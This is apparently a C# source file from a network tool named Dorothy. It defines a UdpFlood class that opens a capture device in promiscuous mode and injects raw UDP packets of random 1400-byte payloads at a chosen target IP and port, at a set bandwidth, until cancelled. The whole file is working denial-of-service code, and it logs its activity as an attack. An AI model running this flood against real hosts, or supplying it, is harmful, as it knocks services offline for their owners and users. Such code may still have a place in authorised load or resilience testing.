using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;

namespace Dorothy.Models
{
    public class UdpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly string _sourceIp;
        private readonly PhysicalAddress _sourceMac;
        private readonly string _targetIp;
        private readonly byte[] _targetMac;
        private readonly byte[] _gatewayMac;
        private readonly int _targetPort;
        private readonly long _bytesPerSecond;
        private readonly CancellationToken _cancellationToken;
        private LibPcapLiveDevice? _device;

        public UdpFlood(string sourceIp, byte[] sourceMac, string targetIp, byte[] targetMac, byte[] gatewayMac, int targetPort, long bytesPerSecond, CancellationToken cancellationToken)
        {
            _sourceIp = sourceIp;
            _sourceMac = new PhysicalAddress(sourceMac);
            _targetIp = targetIp;
            _targetMac = targetMac;
            _gatewayMac = gatewayMac;
            _targetPort = targetPort;
            _bytesPerSecond = bytesPerSecond;
            _cancellationToken = cancellationToken;
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting UDP Flood attack.");

            try
            {
                _device = CaptureDeviceList.Instance
                    .OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d => d.Addresses.Any(addr => addr.Addr.ipAddress != null && addr.Addr.ipAddress.ToString() == _sourceIp));

                if (_device == null)
                {
                    Logger.Error("No device found with the specified source IP.");
                    throw new Exception("No device found with the specified source IP.");
                }

                _device.Open(DeviceModes.Promiscuous, 1000);

                if (_device is not IInjectionDevice injectionDevice)
                {
                    Logger.Error($"Device {_device.Name} does not support packet injection.");
                    throw new Exception($"Device {_device.Name} does not support packet injection.");
                }

                var random = new Random();
                var ethernetPacket = new EthernetPacket(
                    _sourceMac,
                    new PhysicalAddress(_targetIp.Contains(".") && !IsOnSameSubnet(IPAddress.Parse(_sourceIp), IPAddress.Parse(_targetIp)) 
                        ? _gatewayMac 
                        : _targetMac),
                    EthernetType.IPv4);

                var ipPacket = new IPv4Packet(
                    IPAddress.Parse(_sourceIp),
                    IPAddress.Parse(_targetIp))
                {
                    Protocol = ProtocolType.Udp
                };

                var udpPacket = new UdpPacket(
                    0,
                    (ushort)_targetPort)
                {
                    PayloadData = new byte[1400]
                };

                random.NextBytes(udpPacket.PayloadData);
                ipPacket.PayloadPacket = udpPacket;
                ethernetPacket.PayloadPacket = ipPacket;

                double packetSize = ethernetPacket.Bytes.Length;
                int packetsPerSecond = (int)Math.Ceiling(_bytesPerSecond / packetSize);
                int batchSize = 100;
                double delayMicroseconds = (1_000_000.0 * batchSize) / packetsPerSecond;

                Logger.Info($"UDP Flood: Sending {packetsPerSecond} packets per second ({_bytesPerSecond / 125_000} Mbps).");

                await Task.Run(() =>
                {
                    var stopwatch = new System.Diagnostics.Stopwatch();
                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            stopwatch.Restart();
                            for (int i = 0; i < batchSize && !_cancellationToken.IsCancellationRequested; i++)
                            {
                                injectionDevice.SendPacket(ethernetPacket);
                            }

                            double elapsedMicroseconds = stopwatch.ElapsedTicks * 1_000_000.0 / System.Diagnostics.Stopwatch.Frequency;
                            if (elapsedMicroseconds < delayMicroseconds)
                            {
                                int remainingMicroseconds = (int)(delayMicroseconds - elapsedMicroseconds);
                                if (remainingMicroseconds > 1000)
                                {
                                    Thread.Sleep(remainingMicroseconds / 1000);
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex, "Failed to send UDP packet.");
                        }
                    }
                    return Task.CompletedTask;
                }, _cancellationToken);
            }
            catch (TaskCanceledException)
            {
                Logger.Info("UDP Flood attack was canceled.");
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "UDP Flood attack failed.");
                throw;
            }
            finally
            {
                _device?.Close();
                Logger.Info("UDP Flood attack stopped.");
            }
        }

        private int GenerateRandomPort()
        {
            return new Random().Next(1024, 65535);
        }

        public void Dispose()
        {
            _device?.Dispose();
        }

        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        private static extern int SendARP(int DestIP, int SrcIP, byte[] pMacAddr, ref int PhyAddrLen);

        private bool IsOnSameSubnet(IPAddress ip1, IPAddress ip2)
        {
            byte[] subnet = new byte[] { 255, 255, 255, 0 }; // Default subnet mask
            byte[] bytes1 = ip1.GetAddressBytes();
            byte[] bytes2 = ip2.GetAddressBytes();
            
            for (int i = 0; i < 4; i++)
            {
                if ((bytes1[i] & subnet[i]) != (bytes2[i] & subnet[i]))
                    return false;
            }
            return true;
        }
    }
} 